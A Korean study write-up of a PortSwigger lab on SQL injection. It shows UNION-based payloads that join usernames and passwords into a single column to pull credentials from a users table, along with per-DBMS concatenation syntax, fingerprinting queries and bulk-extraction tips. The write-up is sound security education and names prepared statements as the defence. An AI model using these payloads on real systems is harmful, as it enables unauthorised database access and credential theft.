# Lab: SQL injection UNION attack, retrieving multiple values in a single column

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — UNION Attack / 문자열 연결
- **링크**: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
- **참고**: https://portswigger.net/web-security/sql-injection/cheat-sheet

## 목표

문자열 출력이 가능한 컬럼이 1개뿐인 상황에서 `username`과 `password`를 하나의 컬럼에 연결하여 추출하고, `administrator`로 로그인한다.

## 009 랩과의 차이점

009는 두 컬럼 모두 문자열 출력이 가능해서 `username`, `password`를 각각 다른 컬럼에 담을 수 있었다. 이 랩은 컬럼이 2개지만 **문자열 출력이 가능한 컬럼이 1개뿐**이어서, 두 값을 하나로 합쳐서 추출해야 한다.

| 항목 | 009 랩 | 010 랩 |
|------|--------|--------|
| 컬럼 수 | 2 | 2 |
| 문자열 출력 가능 컬럼 | 2개 | 1개 |
| 추출 방법 | 컬럼별로 분리 출력 | 하나의 컬럼에 연결하여 출력 |

## 풀이

### 1단계 — 컬럼 수 파악 및 검증

```sql
' ORDER BY 2--
' UNION SELECT NULL,NULL--
```

컬럼 수 **2개** 확인.

### 2단계 — 문자열 출력 가능한 컬럼 탐색

```sql
' UNION SELECT 'a',NULL--   ← 에러 (1번 컬럼 문자열 불가)
' UNION SELECT NULL,'a'--   ← 정상 (2번 컬럼 문자열 가능)
```

**2번 컬럼만** 문자열 출력 가능.

### 3단계 — DBMS 식별

문자열 연결 문법이 DBMS마다 다르므로, 먼저 DBMS를 파악한다. 버전 쿼리를 시도하거나 에러 메시지·응답 패턴으로 식별한다. 이 랩은 **PostgreSQL** 환경이다.

### 4단계 — username과 password를 하나의 컬럼에 연결

PostgreSQL의 `||` 연산자로 두 값을 구분자와 함께 연결한다.

```sql
' UNION SELECT NULL,username||'~'||password FROM users--
```

응답 예시:

```
administrator~s3cr3tpassword
wiener~abc123
carlos~letmein
```

`~` 구분자를 기준으로 username과 password를 분리하여 `administrator`의 비밀번호를 확인한 뒤 로그인한다.

## 핵심 정리

- 문자열 출력 가능한 컬럼이 1개뿐일 때 **문자열 연결**로 여러 값을 한 번에 추출할 수 있다.
- 구분자는 추출하는 데이터에 포함되지 않을 문자(`~`, `|`, `:` 등)를 선택한다.
- 문자열 연결 문법은 DBMS마다 다르므로 **DBMS 식별이 선행**되어야 한다.
- **방어**: Prepared Statement 사용.

## 배운 점 및 추가 학습

### 1. DBMS별 문자열 연결 문법 총정리

| DBMS | 연결 연산자 | 예시 |
|------|------------|------|
| PostgreSQL | `\|\|` | `username\|\|'~'\|\|password` |
| Oracle | `\|\|` | `username\|\|'~'\|\|password` |
| MySQL | `CONCAT()` | `CONCAT(username,'~',password)` |
| MSSQL | `+` | `username+'~'+password` |

- PostgreSQL과 Oracle은 동일하게 `||`를 사용한다.
- MySQL에서 `||`는 기본 설정에서 OR 연산자로 해석되므로 반드시 `CONCAT()`을 사용해야 한다.
- MSSQL의 `+`는 숫자 컬럼에서는 덧셈으로 동작하므로 문자열 컬럼에서만 사용한다.

### 2. DBMS 식별 방법 요약

문자열 연결처럼 DBMS별로 문법이 갈리는 상황에서는 먼저 DBMS를 식별해야 한다.

| 방법 | 내용 |
|------|------|
| 에러 메시지 | DBMS 이름이 포함되는 경우가 많음 |
| 버전 쿼리 | `@@version`(MySQL/MSSQL), `version()`(PostgreSQL), `v$version`(Oracle) |
| `FROM DUAL` 반응 | 정상이면 Oracle, 에러면 non-Oracle |
| 주석 구문 반응 | `#`이 동작하면 MySQL |

### 3. 구분자 선택 기준

연결된 문자열에서 값을 분리하려면 데이터에 포함되지 않을 구분자가 필요하다.

| 구분자 | 특징 |
|--------|------|
| `~` | 일반 데이터에 거의 포함되지 않음, 범용적 |
| `\|` | 가독성 좋음, 단 `\|\|` 연산자와 혼동 주의 |
| `:`  | 날짜·URL 등 데이터에 포함될 수 있음 |
| `§`·`¤` 등 | 특수문자로 충돌 가능성 최소화 |

### 4. 여러 값을 한 번에 추출할 때의 확장

연결 방식은 2개 값에만 제한되지 않는다. 컬럼이 많거나 추가 정보가 필요할 때도 동일하게 확장할 수 있다.

```sql
-- 세 값을 하나로 연결 (PostgreSQL)
' UNION SELECT NULL,username||'~'||password||'~'||email FROM users--
```

### 5. 추가로 고민해볼 것

- MySQL에서 `GROUP_CONCAT()`을 사용하면 여러 행의 값을 하나의 셀로 합칠 수 있다. 모든 계정 정보를 한 번의 요청으로 추출할 때 유용하다.
- 추출한 비밀번호가 해시값으로 저장되어 있다면 크래킹이 추가로 필요하다. 해시 형식으로 DBMS나 애플리케이션의 특성을 추가로 파악할 수 있다.
